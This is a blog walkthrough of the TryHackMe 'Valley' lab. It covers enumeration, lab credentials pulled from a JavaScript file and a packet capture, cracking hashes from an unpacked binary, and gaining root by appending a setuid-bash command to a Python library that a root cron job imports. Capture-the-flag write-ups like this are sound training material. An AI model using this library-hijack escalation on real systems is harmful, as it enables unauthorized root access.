<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Valley" /><meta property="og:locale" content="en" /><meta name="description" content="TryHackMe Machine ➡️   Easy                            #FTP  #UPX  #pcapng  #python                      https://tryhackme.com/room/valleype Port Scan Results ⤵️" /><meta property="og:description" content="TryHackMe Machine ➡️   Easy                            #FTP  #UPX  #pcapng  #python                      https://tryhackme.com/room/valleype Port Scan Results ⤵️" /><link rel="canonical" href="https://strongshiv8.github.io/posts/Valley/" /><meta property="og:url" content="https://strongshiv8.github.io/posts/Valley/" /><meta property="og:site_name" content="StrongShiv8" /><meta property="og:image" content="https://strongshiv8.github.io/Vulnhub-Files/img/Valley/Untitled.png" /><meta property="og:image:alt" content="TryHackMe Machine 💤" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-11-28T00:00:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://strongshiv8.github.io/Vulnhub-Files/img/Valley/Untitled.png" /><meta name="twitter:image:alt" content="TryHackMe Machine 💤" /><meta property="twitter:title" content="Valley" /><meta name="twitter:site" content="@StrongShiv8" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-10T22:25:35+05:30","datePublished":"2023-11-28T00:00:00+05:30","description":"TryHackMe Machine ➡️   Easy                            #FTP  #UPX  #pcapng  #python                      https://tryhackme.com/room/valleype Port Scan Results ⤵️","headline":"Valley","image":{"alt":"TryHackMe Machine 💤","url":"https://strongshiv8.github.io/Vulnhub-Files/img/Valley/Untitled.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://strongshiv8.github.io/posts/Valley/"},"url":"https://strongshiv8.github.io/posts/Valley/"}</script><title>Valley | StrongShiv8</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="StrongShiv8"><meta name="application-name" content="StrongShiv8"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> document.addEventListener('DOMContentLoaded', () => { const pv = document.getElementById('pageviews'); if (pv !== null) { const uri = location.pathname.replace(/\/$/, ''); const url = `https://strongshiv8.goatcounter.com/counter/${encodeURIComponent(uri)}.json`; fetch(url) .then((response) => response.json()) .then((data) => { const count = data.count.replace(/\s/g, ''); pv.innerText = new Intl.NumberFormat().format(count); }) .catch((error) => { pv.innerText = '1'; }); } }); </script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script async src="https://gc.zgo.at/count.js" data-goatcounter="https://strongshiv8.goatcounter.com/count" ></script> <script src="/assets/js/progress.js" defer></script> <script src="/assets/js/auto-update.js" defer></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar/avatar.jpeg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">StrongShiv8</a><p class="site-subtitle fst-italic mb-0">OSCP | eJPTv2 | Cyber Security Fanatic</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/StrongShiv8" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['lht.shivendra','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://app.hackthebox.com/users/595651" aria-label="hackthebox" target="_blank" rel="noopener noreferrer" > <i class="fa-solid fa-cube"></i> </a> <a href="https://www.linkedin.com/in/shivendra-prajapati-a788401a5/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Valley</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Valley</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1701109800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Nov 28, 2023 </time> </span> <span> Updated <time data-ts="1725987335" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Sep 10, 2024 </time> </span><div class="mt-3 mb-3"> <a href="/Vulnhub-Files/img/Valley/Untitled.png" class="popup img-link preview-img shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled.png" alt="TryHackMe Machine 💤" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">TryHackMe Machine 💤</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/StrongShiv8">Shivendra Prajapati</a> </em> </span><div> <span> <em id="pageviews"> <i class="fas fa-spinner fa-spin small"></i> </em> views </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1296 words" > <em>7 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Valley</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Valley</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>TryHackMe Machine ➡️   <kbd>Easy</kbd> <br />                            <kbd>#FTP</kbd>  <kbd>#UPX</kbd>  <kbd>#pcapng</kbd>  <kbd>#python</kbd>                      <br /> https://tryhackme.com/room/valleype <br /></p><h2 id="port-scan-results-️"><span class="me-2">Port Scan Results ⤵️</span><a href="#port-scan-results-️" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash nolineno highlighter-rouge" file="Nmap_Result.txt"><div class="code-header"> <span data-label-text="Nmap_Result.txt"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Valley]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-oN</span> Nmap_Result.txt 10.10.149.193 
Nmap scan report <span class="k">for </span>10.10.149.193
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 <span class="o">(</span>RSA<span class="o">)</span>
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><h2 id="web-enumeration-️"><span class="me-2">Web Enumeration ⤵️</span><a href="#web-enumeration-️" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I checked port 80 first and got a simple static webpage →</p><p><a href="/Vulnhub-Files/img/Valley/Untitled%201.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%201.png" alt="Untitled" loading="lazy"></a></p><p>Now through Enumeration I for a gallery directory where I can load different images by changing its values like 1,2,3…</p><p><a href="/Vulnhub-Files/img/Valley/Untitled%202.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%202.png" alt="Untitled" loading="lazy"></a></p><p>Now I only tried the value as 0 and I got this output with a hidden directory →</p><p><a href="/Vulnhub-Files/img/Valley/Untitled%203.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%203.png" alt="Untitled" loading="lazy"></a></p><p>on going to that directory I got this login webpage and after digging into its source code from dev.js file I got some credentials →</p><p><a href="/Vulnhub-Files/img/Valley/Untitled%204.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%204.png" alt="Untitled" loading="lazy"></a></p><div class="language-plaintext nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>{: .nolineno}
siemDev : california
</pre></table></code></div></div><p>I also have FTP access so lets use this credentials to get some access →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Valley]
└─<span class="nv">$ </span>ftp 10.10.149.193 37370
Connected to 10.10.149.193.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.149.193:kali<span class="o">)</span>: siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-al</span>
229 Entering Extended Passive Mode <span class="o">(||</span>|18601|<span class="o">)</span>
150 Here comes the directory listing.
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 <span class="nb">.</span>
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 ..
<span class="nt">-rw-rw-r--</span>    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
<span class="nt">-rw-rw-r--</span>    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
<span class="nt">-rw-rw-r--</span>    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
ftp&gt;
</pre></table></code></div></div><p>I downloaded all these files and enumerated further more :</p><p>After sometime while enumeration on <code class="language-plaintext highlighter-rouge">siemHTTP2.pcapng</code> file I got this credentail →</p><p><a href="/Vulnhub-Files/img/Valley/Untitled%205.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%205.png" alt="Untitled" loading="lazy"></a></p><p>Lets Login into the machine →</p><h2 id="ssh-shell-️"><span class="me-2">SSH Shell ➡️</span><a href="#ssh-shell-️" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Valley]
└─<span class="nv">$ </span>ssh valleyDev@10.10.149.193 
valleyDev@10.10.149.193 is password: 
Welcome to Ubuntu 20.04.6 LTS <span class="o">(</span>GNU/Linux 5.4.0-139-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

 <span class="k">*</span> Introducing Expanded Security Maintenance <span class="k">for </span>Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free <span class="k">for </span>personal use.

     https://ubuntu.com/pro
valleyDev@valley:~<span class="nv">$ </span><span class="nb">whoami
</span>valleyDev
valleyDev@valley:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>valleyDev<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>valleyDev<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>valleyDev<span class="o">)</span>
valleyDev@valley:~<span class="err">$</span>
</pre></table></code></div></div><p>Now I changed the username to siemDev with that FTP password and found an executable binary file named as <code class="language-plaintext highlighter-rouge">valleyAuthenticator</code> I transfered that file to attacker machine →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>siemDev@valley:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
total 752
drwxr-xr-x  5 root      root        4096 Mar  6  2023 <span class="nb">.</span>
drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
<span class="nt">-rwxrwxr-x</span>  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
siemDev@valley:/home<span class="nv">$ </span>./valleyAuthenticator 
Welcome to Valley Inc. Authenticator
What is your username: valley
What is your password: valley
Wrong Password or Username
siemDev@valley:/home<span class="err">$</span>
</pre></table></code></div></div><p>Lets dig into this <code class="language-plaintext highlighter-rouge">valleyAuthenticator</code> file →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Valley]
└─<span class="nv">$ </span>file valleyAuthenticator 
valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>GNU/Linux<span class="o">)</span>, statically linked, no section header
                                                                                                                               
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Valley]
└─<span class="nv">$ </span>strings valleyAuthenticator | <span class="nb">head
</span>UPX!
<span class="s2">"E&amp;8
/p8S
a64</span><span class="se">\</span><span class="s2">
o+_x
?pO)_h
</span><span class="sb">`</span>/50
<span class="k">*</span>FX/6/P
@/8_
P4Ao
</pre></table></code></div></div><blockquote class="prompt-info"><p>I got to know about UPX file that is used for Advanced compress of a file up to 50%-70% of a file.</p></blockquote><p>In this case our executable elf binary file is compressed with UPX so we have to decompress it and for that kali linux have default installed UPX on their system and for more info follow this URL →</p><p><a href="https://www.iblue.team/malware-analysis/identifying-upx-packed-elf-decompressing-fixing-and-analysing-linux-malware">⚡PATH</a></p><p><a href="/Vulnhub-Files/img/Valley/Untitled%206.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%206.png" alt="Untitled" loading="lazy"></a></p><p>I got this binary ELF file <code class="language-plaintext highlighter-rouge">valleyAuthenticator.elf</code> →</p><p><a href="/Vulnhub-Files/img/Valley/Untitled%207.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%207.png" alt="Untitled" loading="lazy"></a></p><p>Lets decode this MD5 hashes so that I can get my username &amp; password .</p><p><a href="/Vulnhub-Files/img/Valley/Untitled%208.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%208.png" alt="Untitled" loading="lazy"></a></p><p>I am now valley and I found this root privileged directory and its <code class="language-plaintext highlighter-rouge">photosEncrypt.py</code> file →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>siemDev@valley:/home<span class="nv">$ </span>su valley
Password: 
valley@valley:/home<span class="nv">$ </span><span class="nb">whoami
</span>valley
valley@valley:/home<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>valley<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>valley<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>valley<span class="o">)</span>,1003<span class="o">(</span>valleyAdmin<span class="o">)</span>
valley@valley:/home<span class="nv">$ </span><span class="nb">cd</span> /photos/script/
valley@valley:/photos/script<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> photosEncrypt.py 
<span class="nt">-rwxr-xr-x</span> 1 root root 621 Mar  6  2023 photosEncrypt.py
valley@valley:/photos/script<span class="nv">$ </span><span class="nb">cat </span>photosEncrypt.py 
<span class="c">#!/usr/bin/python3</span>
import <span class="nb">base64
</span><span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>1,7<span class="o">)</span>:
<span class="c"># specify the path to the image file you want to encode</span>
	image_path <span class="o">=</span> <span class="s2">"/photos/p"</span> + str<span class="o">(</span>i<span class="o">)</span> + <span class="s2">".jpg"</span>

<span class="c"># open the image file and read its contents</span>
	with open<span class="o">(</span>image_path, <span class="s2">"rb"</span><span class="o">)</span> as image_file:
          image_data <span class="o">=</span> image_file.read<span class="o">()</span>

<span class="c"># encode the image data in Base64 format</span>
	encoded_image_data <span class="o">=</span> base64.b64encode<span class="o">(</span>image_data<span class="o">)</span>

<span class="c"># specify the path to the output file</span>
	output_path <span class="o">=</span> <span class="s2">"/photos/photoVault/p"</span> + str<span class="o">(</span>i<span class="o">)</span> + <span class="s2">".enc"</span>

<span class="c"># write the Base64-encoded image data to the output file</span>
	with open<span class="o">(</span>output_path, <span class="s2">"wb"</span><span class="o">)</span> as output_file:
    	  output_file.write<span class="o">(</span>encoded_image_data<span class="o">)</span>
valley@valley:/photos/script<span class="err">$</span>
</pre></table></code></div></div><p>It is using base64 module lets see I can alter it or not →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>valley@valley:/photos/script<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /usr/lib/python3.8/base64.py
<span class="nt">-rwxrwxr-x</span> 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
valley@valley:/photos/script<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>valley<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>valley<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>valley<span class="o">)</span>,1003<span class="o">(</span>valleyAdmin<span class="o">)</span>
valley@valley:/photos/script<span class="err">$</span>
</pre></table></code></div></div><p>As I am part of <code class="language-plaintext highlighter-rouge">valleyadmin</code> group so I can edit it so lets add some executable so that it will be executed as root user as I ran <code class="language-plaintext highlighter-rouge">pspy64</code> tool and it is executing each minute →</p><p><a href="/Vulnhub-Files/img/Valley/Untitled%209.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Valley/Untitled%209.png" alt="Untitled" loading="lazy"></a></p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre>valley@valley:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'import os; os.system("chmod +s /bin/bash");'</span> <span class="o">&gt;&gt;</span> /usr/lib/python3.8/base64.py
valley@valley:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /bin/bash
<span class="nt">-rwxr-xr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
valley@valley:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /bin/bash
<span class="nt">-rwxr-xr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
valley@valley:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /bin/bash
<span class="nt">-rwsr-sr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
valley@valley:~<span class="err">$</span>
valley@valley:~<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
bash-5.0# <span class="nb">whoami
</span>root
bash-5.0# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>valley<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>valley<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>valley<span class="o">)</span>,1003<span class="o">(</span>valleyAdmin<span class="o">)</span>
bash-5.0# <span class="nb">cd</span> /root
bash-5.0# <span class="nb">ls</span> <span class="nt">-al</span>
total 56
drwx------  8 root root 4096 Mar 13  2023 <span class="nb">.</span>
drwxr-xr-x 21 root root 4096 Mar  6  2023 ..
<span class="nt">-rw-------</span>  1 root root    0 Mar 21  2023 .bash_history
<span class="nt">-rw-r--r--</span>  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Mar 20  2023 .cache
drwxr-xr-x  4 root root 4096 Mar  6  2023 .config
drwx------  4 root root 4096 Aug 15  2022 .gnupg
drwxr-xr-x  3 root root 4096 Aug 11  2022 .local
<span class="nt">-rw-------</span>  1 root root   49 Mar  3  2023 .mysql_history
<span class="nt">-rw-r--r--</span>  1 root root  161 Dec  5  2019 .profile
<span class="nt">-rw-r--r--</span>  1 root root   37 Mar 13  2023 root.txt
<span class="nt">-rw-r--r--</span>  1 root root   66 Aug 15  2022 .selected_editor
drwx------  3 root root 4096 Aug 11  2022 snap
drwx------  2 root root 4096 Aug 14  2022 .ssh
<span class="nt">-rw-r--r--</span>  1 root root  222 Aug 15  2022 .wget-hsts
bash-5.0# ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group defaul
t qlen 1000
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc mq state UP group defa
ult qlen 1000
    <span class="nb">link</span>/ether 02:fa:c5:3e:12:99 brd ff:ff:ff:ff:ff:ff
    inet 10.10.230.7/16 brd 10.10.255.255 scope global dynamic ens5
       valid_lft 2930sec preferred_lft 2930sec
    inet6 fe80::fa:c5ff:fe3e:1299/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
bash-5.0# <span class="nb">hostname
</span>valley
bash-5.0#
